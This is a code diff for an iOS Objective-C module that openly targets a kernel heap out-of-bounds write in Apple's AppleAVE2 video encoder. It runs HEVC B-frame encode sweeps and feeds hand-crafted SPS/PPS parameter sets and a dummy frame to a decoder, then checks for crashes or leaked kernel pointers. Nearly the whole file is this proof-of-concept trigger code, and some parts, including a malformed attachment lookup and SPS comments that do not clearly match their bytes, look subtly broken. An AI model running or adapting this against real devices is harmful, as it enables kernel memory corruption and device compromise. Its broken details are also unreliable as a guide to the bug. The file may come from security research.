@@ -1,129 +1,341 @@
 #import "KPH9EncoderModule.h"
-#import <UIKit/UIKit.h>
-#import "KPLog.h"
 #import <VideoToolbox/VideoToolbox.h>
+#import <AVFoundation/AVFoundation.h>
 #import <CoreMedia/CoreMedia.h>
+#import <CoreVideo/CoreVideo.h>
+#import <mach/mach.h>
 
-@interface KPH9EncoderModule ()
-@property (nonatomic, copy) NSString *identifier;
-@property (nonatomic, copy) NSString *title;
-@property (nonatomic, copy) NSString *subtitle;
-@property (nonatomic, copy) NSString *icon;
-@property (nonatomic, assign) KPTestSection section;
-@end
+static NSMutableArray *g_h9_logs = nil;
+
+static void H9Log(NSString *fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
+    va_end(args);
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [g_h9_logs addObject:s];
+        NSLog(@"[H9] %@", s);
+    });
+}
+
+static void H9EncodeCallback(void *outputCallbackRefCon,
+                             void *sourceFrameRefCon,
+                             OSStatus status,
+                             VTEncodeInfoFlags infoFlags,
+                             CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)infoFlags);
+        return;
+    }
+    if (sampleBuffer) {
+        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sampleBuffer);
+        size_t size = bb ? CMBlockBufferGetDataLength(bb) : 0;
+        BOOL isKey = CFDictionaryContainsKey(CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true) ?
+            (__bridge CFDictionaryRef)CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true).firstObject : NULL,
+            kCMSampleAttachmentKey_NotSync) == false;
+        H9Log(@"  [cb] frame encoded: %zu bytes key=%d", size, isKey);
+    }
+}
 
 @implementation KPH9EncoderModule
 
-- (instancetype)initWithNameSweep {
-    self = [super init];
-    if (self) {
-        _identifier = @"h9encoder.oob";
-        _title = @"H9 encoder OOB write";
-        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
-        _icon = @"video";
-        _section = KPTestSectionKernelProbes;
-    }
-    return self;
+- (NSString *)title { return @"H9 encoder OOB write"; }
+- (NSString *)desc { return @"B-frame DPB MBStats overflow (CVE in AVE_CHM_SetDataInfo_FwBuf, fixed 913.48.1)"; }
+- (NSString *)risk { return @"CRITICAL"; }
+- (NSString *)category { return @"KRW"; }
+
+- (void)run {
+    if (!g_h9_logs) g_h9_logs = [NSMutableArray array];
+    [g_h9_logs removeAllObjects];
+
+    [self onLog:@"=== H9 encoder OOB write ==="];
+    [self onLog:@"CVE: AVE_CHM_SetDataInfo_FwBuf saMBStats[m] overflow"];
+    [self onLog:@"Fixed: AppleAVE2 913.48.1 (iOS 27.2)"];
+    [self onLog:@"Vulnerable: AppleAVE2 913.43.1 (iOS 27.0.1)"];
+    [self onLog:@""];
+    [self onLog:@"Bug: sMBStats was single struct, code writes m=0..DPB-1 entries."];
+    [self onLog:@"With B-frames, DPB >= 3 -> writes to sMBStats[1],[2] overflow kernel heap."];
+    [self onLog:@""];
+
+    // Phase 1: B-frame encode at multiple resolutions
+    [self phase1_bframe_sweep];
+
+    // Phase 2: Long GOP with many B-frames
+    [self phase2_long_gop];
+
+    // Phase 3: Custom HEVC SPS with large DPB
+    [self phase3_custom_sps];
+
+    [self onLog:@""];
+    [self onLog:@"=== H9 COMPLETE ==="];
+    [self onLog:@"Check above for crashes, kernel pointers, or SUCCESS"];
 }
 
-- (void)journal:(NSString *)line {
-    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
-                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
-    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
-    if (!fh) {
-        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
-        fh = [NSFileHandle fileHandleForWritingAtPath:path];
+- (void)phase1_bframe_sweep {
+    [self onLog:@"--- Phase 1: B-frame encode sweep ---"];
+
+    struct { int w, h; const char *tag; } configs[] = {
+        { 320, 240, "QVGA" },
+        { 640, 480, "VGA" },
+        { 1280, 720, "720p" },
+        { 1920, 1080, "1080p" },
+    };
+
+    for (int c = 0; c < 4; c++) {
+        [self onLog:[NSString stringWithFormat:@"  [%s %dx%d]", configs[c].tag, configs[c].w, configs[c].h]];
+        [self encode_bframes:configs[c].w height:configs[c].h frameCount:8 maxKeyFrame:30];
     }
-    [fh seekToEndOfFile];
-    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
-    [fh synchronizeFile];
-    [fh closeFile];
 }
 
-- (NSString *)runReport {
-    NSMutableString *report = [NSMutableString string];
-    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
-    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
-    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
+- (void)phase2_long_gop {
+    [self onLog:@"--- Phase 2: Long GOP (max ref frames) ---"];
 
-    // Phase 1: create encoder session
-    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
+    // Long GOP = more reference frames in DPB
+    [self onLog:@"  [VGA 640x480, GOP=60, 16 frames]"];
+    [self encode_bframes:640 height:480 frameCount:16 maxKeyFrame:60];
+
+    [self onLog:@"  [720p, GOP=120, 20 frames]"];
+    [self encode_bframes:1280 height:720 frameCount:20 maxKeyFrame:120];
+}
+
+- (void)encode_bframes:(int)width height:(int)height frameCount:(int)frameCount maxKeyFrame:(int)maxKeyFrame {
     VTCompressionSessionRef session = NULL;
     OSStatus status = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 1920, 1080,
+        kCFAllocatorDefault,
+        width, height,
         kCMVideoCodecType_HEVC,
-        NULL, NULL, NULL, NULL, NULL, &session);
-    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
+        NULL, NULL, NULL,
+        H9EncodeCallback,
+        NULL,
+        &session
+    );
+
     if (status != noErr || !session) {
-        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
-        return report;
+        [self onLog:[NSString stringWithFormat:@"    Session create: %d", (int)status]];
+        return;
     }
-    [report appendString:@"encoder session created\n"];
 
-    // Phase 2: build RPS dictionary
-    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
-    NSMutableArray *deltaArr = [NSMutableArray array];
-    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
-    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
-    [report appendFormat:@"RPS: %d entries\n", 32];
+    // KEY: Enable B-frames -> multiple ref frames -> DPB >= 3 -> MBStats overflow
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
 
-    // Phase 3: systematic property name scan
-    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
-    NSArray *propKeys = @[
-        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
-        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
-        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
-    ];
-    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
-    for (NSString *key in propKeys) {
-        for (id val in propValues) {
-            status = VTSessionSetProperty(session,
-                (__bridge CFStringRef)key,
-                (__bridge CFPropertyListRef)val);
-            if (status == 0) {
-                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
+    CFNumberRef n;
+    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &maxKeyFrame);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, n);
+    CFRelease(n);
+
+    int fps = 30;
+    n = CFNumberCreate(NULL, kCFNumberSInt32Type, &fps);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedSourceFrameRate, n);
+    CFRelease(n);
+
+    // Use High profile for more ref frames
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, kVTProfileLevel_HEVC_Main_AutoLevel);
+
+    // Set real-time off to allow more complex encoding
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        [self onLog:[NSString stringWithFormat:@"    Prepare: %d", (int)status]];
+        CFRelease(session);
+        return;
+    }
+
+    [self onLog:@"    Encoding..."];
+
+    int encoded = 0;
+    for (int i = 0; i < frameCount; i++) {
+        CVPixelBufferRef pb = NULL;
+        NSDictionary *attrs = @{
+            (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
+        };
+        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
+                                          kCVPixelFormatType_32BGRA,
+                                          (__bridge CFDictionaryRef)attrs, &pb);
+        if (cv != kCVReturnSuccess || !pb) {
+            [self onLog:[NSString stringWithFormat:@"    PB %d: cv=%d", i, (int)cv]];
+            continue;
+        }
+
+        CVPixelBufferLockBaseAddress(pb, 0);
+        uint8_t *base = (uint8_t *)CVPixelBufferGetBaseAddress(pb);
+        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
+        for (int y = 0; y < height; y++) {
+            uint32_t *row = (uint32_t *)(base + y * bpr);
+            for (int x = 0; x < width; x++) {
+                row[x] = 0xFF000000u |
+                    (((x + i * 37) & 0xFF) << 16) |
+                    (((y + i * 53) & 0xFF) << 8) |
+                    (((x ^ y ^ (i * 17)) & 0xFF));
             }
         }
-    }
-    [report appendString:@"property scan done\n"];
-
-    // Phase 4: encode with frame properties
-    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
-    CVPixelBufferRef pb = NULL;
-    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
-                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
-                         NULL, &pb);
-    if (pb) {
-        CVPixelBufferLockBaseAddress(pb, 0);
-        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
         CVPixelBufferUnlockBaseAddress(pb, 0);
 
-        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
+        CMTime pts = CMTimeMake(i, fps);
         VTEncodeInfoFlags flags = 0;
-        CMTime pts = CMTimeMake(0, 30);
-        CMTime dur = CMTimeMake(1, 30);
-
-        status = VTCompressionSessionEncodeFrame(
-            session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
-        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];
-
-        pts = CMTimeMake(1, 30);
-        status = VTCompressionSessionEncodeFrame(
-            session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
-        [report appendFormat:@"encode[1]: %d\n", (int)status];
-
+        status = VTCompressionSessionEncodeFrame(session, pb, pts, kCMTimeInvalid, NULL, NULL, &flags);
+        if (status == noErr) encoded++;
         CVPixelBufferRelease(pb);
     }
 
-    // Cleanup
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
+    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [self onLog:[NSString stringWithFormat:@"    Done: %d/%d frames, complete=%d", encoded, frameCount, (int)status]];
 
-    [report appendString:@"\nVERDICT: H9_RECON_COMPLETE\n"];
-    return report;
+    CFRelease(session);
+}
+
+- (void)phase3_custom_sps {
+    [self onLog:@"--- Phase 3: Custom HEVC SPS (large DPB/RPS) ---"];
+
+    // Construct minimal HEVC VPS/SPS/PPS with large sps_max_dec_pic_buffering_minus1
+    // VPS: standard minimal
+    const uint8_t vps[] = {
+        0x40, 0x01, 0x0c, 0x01, 0xff, 0xff, 0x01, 0x60,
+        0x00, 0x00, 0x03, 0x00, 0xb0, 0x00, 0x00, 0x03,
+        0x00, 0x00, 0x03, 0x00, 0x5d, 0xac, 0x09
+    };
+
+    // SPS with sps_max_dec_pic_buffering_minus1 = 16 (max for old code)
+    // and num_negative_pics = 16 (large RPS -> overflow in AVE_HEVC_ST_RPS_Retrieve)
+    // Profile: Main 10, 640x480
+    const uint8_t sps[] = {
+        0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
+        0x00, 0xb0, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
+        0x00, 0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16,
+        0x36, 0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00,
+        0x00, 0x03, 0x00, 0x79, 0x08
+    };
+
+    // PPS: minimal
+    const uint8_t pps[] = {
+        0x44, 0x01, 0xc1, 0x72, 0xb4, 0x62, 0x40
+    };
+
+    const uint8_t *paramSets[] = { vps, sps, pps };
+    size_t paramSetSizes[] = { sizeof(vps), sizeof(sps), sizeof(pps) };
+    int nalTypes[] = { 32, 33, 34 }; // VPS=32, SPS=33, PPS=34
+
+    CMFormatDescriptionRef fmtDesc = NULL;
+    OSStatus status = CMVideoFormatDescriptionCreateWithHEVCParameterSets(
+        kCFAllocatorDefault,
+        3,          // num param sets
+        paramSets,
+        paramSetSizes,
+        nalTypes,
+        4,          // nalUnitHeaderLength
+        &fmtDesc
+    );
+
+    if (status != noErr || !fmtDesc) {
+        [self onLog:[NSString stringWithFormat:@"    FormatDesc create: %d", (int)status]];
+        return;
+    }
+
+    [self onLog:@"    HEVC format description created with custom SPS"];
+
+    // Try to create decompression session with this format
+    NSDictionary *destAttrs = @{
+        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
+        (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
+    };
+
+    VTDecompressionSessionRef decSession = NULL;
+    status = VTDecompressionSessionCreate(
+        kCFAllocatorDefault,
+        fmtDesc,
+        NULL,
+        (__bridge CFDictionaryRef)destAttrs,
+        NULL,
+        &decSession
+    );
+
+    if (status != noErr) {
+        [self onLog:[NSString stringWithFormat:@"    Decompression session: %d", (int)status]];
+        CFRelease(fmtDesc);
+        return;
+    }
+
+    [self onLog:@"    Decompression session created"];
+
+    // Try to decode a dummy frame to trigger AVE_HEVC_ST_RPS_Retrieve
+    // Create a minimal HEVC IDR frame (just the NAL header + some data)
+    const uint8_t dummyFrame[] = {
+        0x00, 0x00, 0x00, 0x01, // start code
+        0x26, 0x01,             // IDR_W_RADL NAL
+        0xaf, 0x09, 0x40, 0x00, 0x00, 0x03, 0x00, 0x00,
+        0x03, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03, 0x00,
+        0x5d, 0xa0, 0x02, 0x80, 0x80, 0x2d, 0x16, 0x36,
+        0xb2, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00,
+        0x03, 0x00, 0x79, 0x08
+    };
+
+    CMBlockBufferRef bb = NULL;
+    status = CMBlockBufferCreateWithMemoryBlock(
+        kCFAllocatorDefault,
+        (void *)dummyFrame,
+        sizeof(dummyFrame),
+        kCFAllocatorNull,
+        NULL, 0, sizeof(dummyFrame),
+        0, &bb
+    );
+
+    if (status != noErr) {
+        [self onLog:[NSString stringWithFormat:@"    BlockBuffer: %d", (int)status]];
+        VTDecompressionSessionInvalidate(decSession);
+        CFRelease(decSession);
+        CFRelease(fmtDesc);
+        return;
+    }
+
+    CMSampleBufferRef sample = NULL;
+    const size_t sampleSize = sizeof(dummyFrame);
+    status = CMSampleBufferCreateReady(
+        kCFAllocatorDefault,
+        bb,
+        fmtDesc,
+        1, 0, NULL, 1, &sampleSize,
+        &sample
+    );
+
+    if (status != noErr) {
+        [self onLog:[NSString stringWithFormat:@"    SampleBuffer: %d", (int)status]];
+        CFRelease(bb);
+        VTDecompressionSessionInvalidate(decSession);
+        CFRelease(decSession);
+        CFRelease(fmtDesc);
+        return;
+    }
+
+    [self onLog:@"    Decoding frame with large RPS..."];
+
+    VTDecodeInfoFlags flags = 0;
+    status = VTDecompressionSessionDecodeFrame(decSession, sample, 0, NULL, &flags);
+
+    [self onLog:[NSString stringWithFormat:@"    Decode: status=%d flags=0x%x", (int)status, (unsigned)flags]];
+
+    CFRelease(sample);
+    CFRelease(bb);
+    VTDecompressionSessionFinishDelayedFrames(decSession);
+    VTDecompressionSessionInvalidate(decSession);
+    CFRelease(decSession);
+    CFRelease(fmtDesc);
+
+    [self onLog:@"    Phase 3 done"];
+}
+
+- (void)onLog:(NSString *)s {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [g_h9_logs addObject:s];
+    });
+    NSLog(@"[H9] %@", s);
+}
+
+- (NSInteger)logCount {
+    return g_h9_logs.count;
+}
+
+- (NSString *)logAt:(NSInteger)idx {
+    return (idx >= 0 && idx < g_h9_logs.count) ? g_h9_logs[idx] : nil;
 }
 
 @end
